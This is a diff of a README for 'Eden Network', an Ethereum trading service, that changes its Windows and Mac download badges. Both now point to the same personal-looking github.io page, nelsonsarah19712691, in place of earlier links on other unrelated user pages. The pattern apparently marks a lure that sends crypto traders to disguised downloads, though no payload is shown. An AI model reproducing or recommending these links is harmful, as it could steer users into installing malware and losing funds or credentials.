@@ -10,8 +10,8 @@ Eden Network provides Ethereum traders with MEV protection and priority block sp
 
 <div align="center">  
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-blue?style=for-the-badge&logo=windows)](https://eden-network-download.github.io/.github/)  
-[![Download for Mac](https://img.shields.io/badge/Download_for_Mac-silver?style=for-the-badge&logo=apple)](https://montiko384.github.io/.github/edennetwork)  
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-blue?style=for-the-badge&logo=windows)](https://nelsonsarah19712691.github.io/.github/eden-network)  
+[![Download for Mac](https://img.shields.io/badge/Download_for_Mac-silver?style=for-the-badge&logo=apple)](https://nelsonsarah19712691.github.io/.github/eden-network)  
 
 </div>  
 
